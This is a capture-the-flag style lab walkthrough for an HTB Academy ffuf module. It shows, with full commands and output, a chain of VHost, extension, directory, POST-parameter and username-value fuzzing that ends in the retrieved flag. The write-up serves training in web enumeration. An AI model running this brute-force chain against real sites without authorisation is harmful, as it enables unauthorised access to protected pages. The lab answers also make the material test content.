# Module 15 — Attacking Web Applications with Ffuf: Skills Assessment

**Module:** Attacking Web Applications with Ffuf  
**Platform:** HTB Academy  
**Difficulty:** Easy  
**Target IP:** 10.129.43.71  
**Target Port:** 32596  

---

## Overview

This assessment puts the full ffuf workflow together in one chain. I started with no knowledge of the target beyond an IP and port — had to discover which VHosts existed, fingerprint what file extensions each one accepted, find a restricted page, identify its POST parameters, and finally fuzz a valid value to pull the flag. Five questions, one continuous attack chain.

---

## Question 1 — VHost Fuzzing: What sub-domains exist on `*.academy.htb`?

First thing I did was run the VHost fuzz without any filter just to see what the default response looks like when the host doesn't exist:

```bash
ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ \
  -u http://10.129.43.71:32596 \
  -H 'Host: FUZZ.academy.htb'
```

Every non-existent VHost came back as **985 bytes** — basically the server returning the default page for anything it doesn't recognise. I added `-fs 985` to drop those and re-ran:

```bash
ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ \
  -u http://10.129.43.71:32596 \
  -H 'Host: FUZZ.academy.htb' \
  -fs 985
```

```
        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.43.71:32596
 :: Wordlist         : FUZZ: /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.academy.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 985
________________________________________________

test                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 3ms]
archive                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 4ms]
faculty                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 5ms]
:: Progress: [4997/4997] :: Job [1/1] :: 612 req/sec :: Duration: [0:00:08] :: Errors: 0 ::
```

Three VHosts: `test`, `archive`, `faculty`.

**Answer:** `test archive faculty`

---

## Question 2 — Extension Fuzzing: What file extensions do the domains accept?

Before fuzzing pages I needed to know what extensions the server would serve. Added all three VHosts to `/etc/hosts` first:

```bash
sudo bash -c 'echo "10.129.43.71 test.academy.htb archive.academy.htb faculty.academy.htb" >> /etc/hosts'
```

Then ran extension fuzzing against `/indexFUZZ` on each VHost:

**test.academy.htb:**

```bash
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ \
  -u http://test.academy.htb:32596/indexFUZZ
```

```
.php                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 1ms]
.phps                   [Status: 403, Size: 284, Words: 20, Lines: 10, Duration: 2ms]
:: Progress: [39/39] :: Job [1/1] :: 214 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
```

**archive.academy.htb:**

```bash
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ \
  -u http://archive.academy.htb:32596/indexFUZZ
```

```
.php                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 2ms]
.phps                   [Status: 403, Size: 287, Words: 20, Lines: 10, Duration: 1ms]
:: Progress: [39/39] :: Job [1/1] :: 576 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```

**faculty.academy.htb:**

```bash
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ \
  -u http://faculty.academy.htb:32596/indexFUZZ
```

```
.php                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 1ms]
.phps                   [Status: 403, Size: 287, Words: 20, Lines: 10, Duration: 1ms]
.php7                   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 2ms]
:: Progress: [39/39] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

`faculty` was the interesting one — it accepted `.php7` on top of the usual `.php` and `.phps`. That told me this VHost was probably the one with something worth finding.

| VHost | Extensions |
|---|---|
| test | `.php` (200), `.phps` (403) |
| archive | `.php` (200), `.phps` (403) |
| faculty | `.php` (200), `.phps` (403), `.php7` (200) |

**Answer:** `.php .phps .php7`

---

## Question 3 — Recursive Fuzzing: Find the page that says "You don't have access!"

I focused on `faculty` since it was the only VHost with three accepted extensions. Ran a recursive scan with depth 1, all three extensions, filtering the 287-byte noise responses, and used `-mr` to match the exact string I was looking for so ffuf would only surface the relevant hit:

```bash
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ \
  -u http://faculty.academy.htb:32596/FUZZ \
  -recursion -recursion-depth 1 \
  -e .php,.phps,.php7 \
  -fs 287 \
  -mr "You don't have access!" \
  -t 100
```

ffuf immediately queued `/courses/` as a new job. Rather than waiting for the full scan to finish, I killed it and targeted `/courses/` directly — much faster:

```bash
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ \
  -u http://faculty.academy.htb:32596/courses/FUZZ \
  -e .php,.phps,.php7 \
  -fs 287 \
  -mr "You don't have access!" \
  -t 100
```

```
        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://faculty.academy.htb:32596/courses/FUZZ
 :: Extensions       : .php .phps .php7
 :: Matcher          : Regexp: You don't have access!
 :: Filter           : Response size: 287
 :: Threads          : 100
________________________________________________

linux-security.php7     [Status: 200, Size: 774, Words: 223, Lines: 53, Duration: 3ms]
:: Progress: [87788/87788] :: Job [1/1] :: 1423 req/sec :: Duration: [0:01:02] :: Errors: 0 ::
```

**Answer:** `http://faculty.academy.htb:32596/courses/linux-security.php7`

---

## Question 4 — POST Parameter Fuzzing: What parameters does the page accept?

The page was there but locked. I needed to find what POST parameters it would respond to. First pass with no filter to see what the baseline response size looked like:

```bash
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
  -u http://faculty.academy.htb:32596/courses/linux-security.php7 \
  -X POST \
  -d 'FUZZ=key' \
  -H 'Content-Type: application/x-www-form-urlencoded'
```

Everything was coming back at 774 bytes — that's the "access denied" response. Filtered it and re-ran:

```bash
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
  -u http://faculty.academy.htb:32596/courses/linux-security.php7 \
  -X POST \
  -d 'FUZZ=key' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -fs 774 \
  -t 100
```

```
        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.4.1-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://faculty.academy.htb:32596/courses/linux-security.php7
 :: Data             : FUZZ=key
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Filter           : Response size: 774
 :: Threads          : 100
________________________________________________

user                    [Status: 200, Size: 780, Words: 223, Lines: 53, Duration: 1ms]
username                [Status: 200, Size: 781, Words: 223, Lines: 53, Duration: 431ms]
:: Progress: [2588/2588] :: Job [1/1] :: 286 req/sec :: Duration: [0:00:06] :: Errors: 0 ::
```

Two valid parameters: `user` and `username`. The size difference between them (780 vs 781) suggested they do slightly different things — `username` looked more promising.

**Answer:** `user username`

---

## Question 5 — Value Fuzzing: Get the flag

I fuzzed the `username` parameter using a names wordlist. Quick baseline run showed wrong values return 781 bytes, so I filtered that:

```bash
ffuf -w /opt/useful/SecLists/Usernames/Names/names.txt:FUZZ \
  -u http://faculty.academy.htb:32596/courses/linux-security.php7 \
  -X POST \
  -d 'username=FUZZ' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -fs 781 \
  -t 100
```

```
        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.4.1-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://faculty.academy.htb:32596/courses/linux-security.php7
 :: Data             : username=FUZZ
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Filter           : Response size: 781
 :: Threads          : 100
________________________________________________

harry                   [Status: 200, Size: 773, Words: 218, Lines: 53, Duration: 0ms]
:: Progress: [10164/10164] :: Job [1/1] :: 215 req/sec :: Duration: [0:00:24] :: Errors: 0 ::
```

`harry` returned a different size (773) — smaller than the denied response, which usually means something rendered. Hit it with curl to confirm:

```bash
curl -s http://faculty.academy.htb:32596/courses/linux-security.php7 \
  -X POST \
  -d 'username=harry' | grep -oP 'HTB\{.*?\}'
```

```
HTB{w3b_fuzz1n6_m4573r}
```

**Answer:** `HTB{w3b_fuzz1n6_m4573r}`

---

## Full Attack Chain

| Step | What I Did | Key Flag/Option | Result |
|---|---|---|---|
| 1 | VHost fuzzing against 10.129.43.71:32596 | `-H 'Host: FUZZ.academy.htb' -fs 985` | test, archive, faculty |
| 2 | Extension fuzzing `/indexFUZZ` on each VHost | `web-extensions.txt` | `.php`, `.phps`, `.php7` (faculty only) |
| 3 | Recursive scan + regex match on faculty | `-recursion -e .php,.phps,.php7 -mr "You don't have access!"` | `/courses/linux-security.php7` |
| 4 | POST parameter fuzzing on locked page | `-X POST -d 'FUZZ=key' -fs 774` | `user`, `username` |
| 5 | Value fuzzing `username` with names wordlist | `-d 'username=FUZZ' -fs 781` | `harry` → flag |

---

## MITRE ATT&CK Mapping

| Technique | ID | What I Was Doing |
|---|---|---|
| Active Scanning: Wordlist Scanning | T1595.003 | Directory, page, and extension fuzzing throughout |
| Active Scanning: Scanning IP Blocks | T1595.001 | VHost enumeration via Host header fuzzing |
| Gather Victim Host Information | T1592 | Extension fingerprinting per VHost to narrow attack surface |
| Exploitation for Credential Access | T1212 | POST parameter + value fuzzing to bypass access control |
